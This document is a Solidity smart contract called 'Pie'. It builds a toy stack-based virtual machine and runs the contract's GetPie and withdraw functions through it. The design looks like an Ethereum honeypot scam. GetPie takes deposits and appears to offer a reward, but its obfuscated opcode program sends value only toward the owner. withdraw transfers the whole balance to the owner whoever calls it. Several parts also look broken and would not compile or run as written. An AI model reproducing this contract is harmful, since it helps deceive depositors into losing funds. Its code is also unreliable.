pragma solidity ^0.4.19;

contract Pie {
    address public Owner = msg.sender;

    enum Opcode { PUSH, POP, ADD, SUB, JMP, JZ, LOAD, STORE, CALL, RETURN }
    
    struct VM {
        uint256[] stack;
        uint256 pc;
        mapping(uint256 => uint256) memorySlots;
    }

    function execute(uint256[] instructions) internal {
        VM memory vm = VM(new uint256[](0), 0, mapping(uint256 => uint256)());
        while (vm.pc < instructions.length) {
            uint256 opcode = instructions[vm.pc];
            vm.pc++;
            if (opcode == uint256(Opcode.PUSH)) {
                vm.stack.push(instructions[vm.pc++]);
            } else if (opcode == uint256(Opcode.POP)) {
                vm.stack.length--;
            } else if (opcode == uint256(Opcode.ADD)) {
                uint256 a = vm.stack[vm.stack.length - 1];
                uint256 b = vm.stack[vm.stack.length - 2];
                vm.stack.length -= 2;
                vm.stack.push(a + b);
            } else if (opcode == uint256(Opcode.SUB)) {
                uint256 a = vm.stack[vm.stack.length - 1];
                uint256 b = vm.stack[vm.stack.length - 2];
                vm.stack.length -= 2;
                vm.stack.push(a - b);
            } else if (opcode == uint256(Opcode.JMP)) {
                vm.pc = instructions[vm.pc];
            } else if (opcode == uint256(Opcode.JZ)) {
                if (vm.stack[vm.stack.length - 1] == 0) {
                    vm.pc = instructions[vm.pc];
                } else {
                    vm.pc++;
                }
                vm.stack.length--;
            } else if (opcode == uint256(Opcode.LOAD)) {
                vm.stack.push(vm.memorySlots[instructions[vm.pc++]]);
            } else if (opcode == uint256(Opcode.STORE)) {
                vm.memorySlots[instructions[vm.pc++]] = vm.stack[vm.stack.length - 1];
                vm.stack.length--;
            } else if (opcode == uint256(Opcode.CALL)) {
                uint256 addressIndex = vm.stack[vm.stack.length - 1];
                vm.stack.length--;
                address adr = address(addressIndex);
                bytes memory data = new bytes(0);
                adr.call.value(vm.stack[vm.stack.length - 1])(data);
                vm.stack.length--;
            } else if (opcode == uint256(Opcode.RETURN)) {
                return;
            }
        }
    }

    function() public payable {}

    function GetPie() public payable {
        uint256[] memory instructions = new uint256[](11);
        instructions[0] = uint256(Opcode.PUSH);
        instructions[1] = 1 ether;
        instructions[2] = uint256(Opcode.LOAD);
        instructions[3] = 0; // msg.value
        instructions[4] = uint256(Opcode.SUB);
        instructions[5] = uint256(Opcode.JZ);
        instructions[6] = 10; // End
        instructions[7] = uint256(Opcode.LOAD);
        instructions[8] = uint256(Owner);
        instructions[9] = uint256(Opcode.CALL);
        execute(instructions);
    }

    function withdraw() public payable {
        uint256[] memory instructions = new uint256[](9);
        instructions[0] = uint256(Opcode.PUSH);
        instructions[1] = uint256(msg.sender);
        instructions[2] = uint256(Opcode.PUSH);
        instructions[3] = uint256(Owner);
        instructions[4] = uint256(Opcode.SUB);
        instructions[5] = uint256(Opcode.JZ);
        instructions[6] = 8; // End
        instructions[7] = uint256(Opcode.RETURN);
        execute(instructions);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
}